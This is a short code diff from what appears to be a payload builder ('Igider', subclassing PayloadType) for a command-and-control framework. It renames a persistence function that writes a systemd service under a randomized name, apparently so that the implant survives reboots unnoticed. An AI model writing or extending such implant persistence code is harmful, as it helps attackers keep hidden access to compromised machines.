@@ -452,7 +452,7 @@ class Igider(PayloadType):
                 command_code += f"""
     import os, random, subprocess, sys
 
-    def create_persistence_linux(self):
+    def create_persistence(self):
         try:
             svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
             service_file = f"/etc/systemd/system/{{svc_name}}.service"
